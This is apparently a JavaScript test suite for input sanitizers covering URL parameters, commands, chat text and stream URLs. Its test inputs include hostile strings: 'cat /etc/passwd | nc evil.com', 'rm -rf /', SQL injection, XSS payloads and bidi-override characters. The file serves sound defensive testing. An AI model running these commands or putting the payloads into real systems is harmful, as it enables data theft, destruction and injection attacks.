// test/sanitize.test.js
import { test, describe } from "node:test";
import assert from "node:assert/strict";
import { sanitizeUrlParam, sanitizeCommand, sanitizeChat, sanitizeStreamUrl } from "../src/utils/sanitize.js";

describe("Sanitization Suite", () => {
    describe("sanitizeUrlParam", () => {
        test("strips script protocols", () => {
            assert.equal(sanitizeUrlParam("javascript:alert(1)"), "alert(1)");
            assert.equal(sanitizeUrlParam("JAVASCRIPT:alert(1)"), "alert(1)");
            assert.equal(sanitizeUrlParam("data:text/html,<script>"), "text/html,");
            assert.equal(sanitizeUrlParam("vbscript:msgbox(1)"), "msgbox(1)");
        });

        test("strips nested and obfuscated script protocols", () => {
            assert.equal(sanitizeUrlParam("javajavascript:script:alert(1)"), "alert(1)");
            assert.equal(sanitizeUrlParam("java\u200Bscript:alert(1)"), "alert(1)");
            assert.equal(sanitizeUrlParam("javascript  :alert(1)"), "alert(1)");
        });

        test("strips HTML tags and script injections", () => {
            assert.equal(sanitizeUrlParam("<script>alert(1)</script>"), "alert(1)");
            assert.equal(sanitizeUrlParam("<img src=x onerror=alert(1)>"), "");
            assert.equal(sanitizeUrlParam("prefix<script>alert(1)</script>suffix"), "prefixalert(1)suffix");
            assert.equal(sanitizeUrlParam("<<script>script>alert(1)<</script>/script>"), "alert(1)");
        });

        test("decodes and strips percent-encoded injection sequences", () => {
            assert.equal(sanitizeUrlParam("%3Cscript%3Ealert(1)%3C%2Fscript%3E"), "alert(1)");
            assert.equal(sanitizeUrlParam("%6a%61%76%61%73%63%72%69%70%74:alert(1)"), "alert(1)");
            assert.equal(sanitizeUrlParam("%253Cscript%253Ealert(1)%253C%252Fscript%253E"), "alert(1)");
        });

        test("removes leading #, ?, or / route indicators", () => {
            assert.equal(sanitizeUrlParam("#project-alpha"), "project-alpha");
            assert.equal(sanitizeUrlParam("?query=work"), "query=work");
            assert.equal(sanitizeUrlParam("#/work-item"), "work-item");
        });

        test("strips dangerous injection characters", () => {
            assert.equal(sanitizeUrlParam("test;rm -rf /"), "testrm -rf /");
            assert.equal(sanitizeUrlParam("test`echo hi`"), "testecho hi");
            assert.equal(sanitizeUrlParam("test' OR 1=1--"), "test OR 1=1--");
        });

        test("preserves legitimate slugs and parameters", () => {
            assert.equal(sanitizeUrlParam("interdimensional-theater-2024"), "interdimensional-theater-2024");
            assert.equal(sanitizeUrlParam("work_item_01"), "work_item_01");
        });

        test("clamps excessive length", () => {
            const longString = "a".repeat(200);
            assert.equal(sanitizeUrlParam(longString).length, 100);
        });

        test("handles non-string inputs gracefully", () => {
            assert.equal(sanitizeUrlParam(null), "");
            assert.equal(sanitizeUrlParam(undefined), "");
            assert.equal(sanitizeUrlParam(12345), "");
        });
    });

    describe("sanitizeCommand", () => {
        test("strips shell pipe and command chaining operators", () => {
            assert.equal(sanitizeCommand("cat /etc/passwd | nc evil.com"), "cat /etc/passwd nc evil.com");
            assert.equal(sanitizeCommand("work; rm -rf /"), "work rm -rf /");
            assert.equal(sanitizeCommand("help && sudo reboot"), "help sudo reboot");
        });

        test("strips backticks, quotes, and HTML tags", () => {
            assert.equal(sanitizeCommand("theme `disco`"), "theme disco");
            assert.equal(sanitizeCommand("echo <script>hi</script>"), "echo hi");
            assert.equal(sanitizeCommand("cat <<script>script>alert(1)</script>"), "cat alert(1)");
        });

        test("strips nested script protocols in commands", () => {
            assert.equal(sanitizeCommand("cat javajavascript:script:alert(1)"), "cat alert(1)");
            assert.equal(sanitizeCommand("view java\u200Bscript:alert(1)"), "view alert(1)");
        });

        test("normalizes multiple whitespace", () => {
            assert.equal(sanitizeCommand("work    project-1"), "work project-1");
        });

        test("clamps command length to 120 chars", () => {
            const longCmd = "x".repeat(300);
            assert.equal(sanitizeCommand(longCmd).length, 120);
        });
    });

    describe("sanitizeChat", () => {
        test("strips Unicode bidirectional override characters (Trojan Source)", () => {
            // U+202E (Right-to-Left Override)
            const bidiString = "Hello \u202Ereversed\u202C world";
            assert.equal(sanitizeChat(bidiString), "Hello reversed world");
            // U+2066 (Left-to-Right Isolate)
            const isolateString = "User\u2066Admin\u2069";
            assert.equal(sanitizeChat(isolateString), "UserAdmin");
        });

        test("strips zero-width characters in chat", () => {
            assert.equal(sanitizeChat("user\u200Bname"), "username");
            assert.equal(sanitizeChat("\uFEFFadmin"), "admin");
        });

        test("strips HTML tags and nested tags in chat", () => {
            assert.equal(sanitizeChat("Hello <b>world</b>!"), "Hello world!");
            assert.equal(sanitizeChat("<script>alert('xss')</script>nice!"), "alert('xss')nice!");
            assert.equal(sanitizeChat("<<script>script>alert(1)</script>"), "alert(1)");
        });

        test("enforces strict 200 character clamp", () => {
            const longMsg = "c".repeat(350);
            assert.equal(sanitizeChat(longMsg).length, 200);
        });

        test("strips dangerous script protocols", () => {
            assert.equal(sanitizeChat("javascript:void(0)"), "void(0)");
            assert.equal(sanitizeChat("javajavascript:script:void(0)"), "void(0)");
        });
    });

    describe("sanitizeStreamUrl", () => {
        test("accepts valid http, https, ws, wss URLs", () => {
            assert.equal(sanitizeStreamUrl("https://live.sisyfuz.com/feed"), "https://live.sisyfuz.com/feed");
            assert.equal(sanitizeStreamUrl("http://localhost:8080/webrtc"), "http://localhost:8080/webrtc");
            assert.equal(sanitizeStreamUrl("wss://stream.trycloudflare.com/ws"), "wss://stream.trycloudflare.com/ws");
            assert.equal(sanitizeStreamUrl("ws://127.0.0.1:9000"), "ws://127.0.0.1:9000/");
        });

        test("rejects dangerous or unexpected protocols", () => {
            assert.equal(sanitizeStreamUrl("javascript:alert(1)"), "");
            assert.equal(sanitizeStreamUrl("data:text/html,<script>"), "");
            assert.equal(sanitizeStreamUrl("file:///etc/passwd"), "");
            assert.equal(sanitizeStreamUrl("blob:https://example.com/uuid"), "");
        });

        test("handles invalid inputs gracefully", () => {
            assert.equal(sanitizeStreamUrl(""), "");
            assert.equal(sanitizeStreamUrl(null), "");
            assert.equal(sanitizeStreamUrl("not a url"), "");
        });
    });
});
